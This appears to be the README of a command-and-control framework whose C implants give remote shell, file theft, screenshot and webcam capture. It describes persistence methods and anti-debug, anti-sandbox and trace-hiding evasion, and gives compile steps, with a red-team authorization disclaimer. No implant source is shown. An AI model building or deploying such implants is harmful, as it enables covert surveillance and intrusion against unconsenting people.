# C2 Panel (BETA)

PHP backend + C beacon surveillance panel with full-featured web UI.

> **Beta release** — features are functional but subject to change. Use on systems you own or have explicit authorization to test.

## Quick Start

1. **Drop `githubVERSION/`** into your Apache `htdocs` (or any PHP web server)
2. **Open setup** in your browser:
   ```
   http://yourserver/setup.php
   ```
3. **Follow the prompts** -- setup generates `.env` with random secrets and creates the admin account
4. **Delete `setup.php`** after setup (recommended)
5. **Login** at the panel with the credentials setup gave you

## Beacons

Edit the beacon source files with your server URL and `BEACON_SECRET` (shown at end of setup), then compile:

| File | Platform | Compile |
|---|---|---|
| `payload/beacon_persist.c` | Windows (manual persist) | `gcc beacon_persist.c -o beacon.exe -lws2_32 -lgdi32 -lvfw32 -mwindows -O2 -s` |
| `payload/beacon_auto.c` | Windows (auto persist) | `gcc beacon_auto.c -o beacon.exe -lws2_32 -lgdi32 -lvfw32 -mwindows -O2 -s` |
| `payload/beacon_linux.c` | Linux | `gcc -o beacon beacon_linux.c -s -Os` |

- **beacon_persist**: Run the exe, it phones home. You click persist in the panel when ready.
- **beacon_auto**: Run the exe, it persists itself immediately on execution.
- **beacon_linux**: Run the binary. Daemonizes to background. Crontab + systemd + .bashrc persistence.

### Features

**Panel (Web UI):**
- File manager (browse all partitions, upload, download, delete)
- Terminal (shell commands, history, clear)
- Screenshot capture (DPI-aware, full virtual screen, multi-monitor)
- Camera capture (VFW)
- Human-device linking (profile system for operators)
- Task history (all commands/results with export)
- Ping with timestamp
- Device notes and rename
- Help panel with command reference
- AJAX login, dark theme, responsive UI

**Windows Beacon (C implant):**
- Commands: `browse`, `drives`, `pull`, `push`, `read`, `screenshot`, `camera`, `persist`, `selfdestruct`, `shell`, `ps`, `kill`, `hostname`, `ipconfig`
- Persistence: Registry Run key, Startup folder (.vbs launcher), Scheduled Task (if admin), copied exe
- Self-destruct: removes all artifacts (files, registry, scheduled tasks, .vbs scripts, exe on reboot)
- Anti-debug (PEB check, `CheckRemoteDebuggerPresent`)
- Anti-sandbox (VM detection, CPU/RAM/disk thresholds, known sandbox DLLs)
- Runtime API resolution (no import table traces)
- UUID stored in `%APPDATA%\.appdata.dat`
- Burst mode: re-checks C2 in 2-3s after executing tasks (no full sleep delay)

**Linux Beacon (C implant):**
- Commands: `shell`, `browse`, `drives`, `read`, `pull`, `push`, `delete`, `ps`, `kill`, `hostname`, `ifconfig`, `persist`, `selfdestruct`, `die`
- Persistence: crontab @reboot, systemd user service, init.d (root), /usr/local/bin copy (root), .bashrc
- Self-destruct: removes all persistence, deletes UUID + exe
- Anti-debug: passive TracerPid check
- Anti-sandbox: VM artifact detection, CPU/RAM/disk checks
- UUID stored in `/tmp/.appdata.dat`
- Daemonizes to background, burst mode after tasks
- No external dependencies (raw sockets, POSIX APIs)

## Directory Structure

```
├── api.php                 API entry point
├── index.php               Panel UI + login gate
├── setup.php               One-time setup wizard
├── .env.example            Environment template
├── assets/
│   ├── panel.js            Panel JavaScript
│   └── panel.css           Dark theme CSS
├── handlers/               PHP API handlers
│   ├── auth.php            Login/logout
│   ├── beacon.php          Beacon checkin
│   ├── device.php          Device management
│   ├── file.php            File upload/download
│   ├── filebrowser.php     Browse cache + directory requests
│   ├── media.php           Screenshot/camera
│   ├── payload.php         Payload serving
│   ├── persons.php         Human profiles
│   ├── result.php          Task results
│   └── task.php            Task CRUD
├── includes/               PHP core
│   ├── auth.php            Session, CSRF, login form
│   ├── config.php          Env loader, constants
│   ├── db.php              JSON file-based database
│   ├── helpers.php         Utility functions
│   └── router.php          Request routing
├── payload/                C beacon source files
│   ├── beacon_persist.c    Windows beacon (manual persist)
│   ├── beacon_auto.c       Windows beacon (auto persist)
│   └── beacon_linux.c      Linux beacon
├── data/                   JSON storage (created by setup)
└── uploads/                File storage (created by setup)
```

## Requirements

- PHP 7.4+
- Apache with `mod_rewrite`
- MinGW-w64 (for compiling Windows beacons)
- GCC (for compiling Linux beacon on target)
- XAMPP recommended (ships with PHP + Apache)

## Security Notice

This is a red team / authorized testing tool. Only use on systems you own or have explicit written authorization to test.
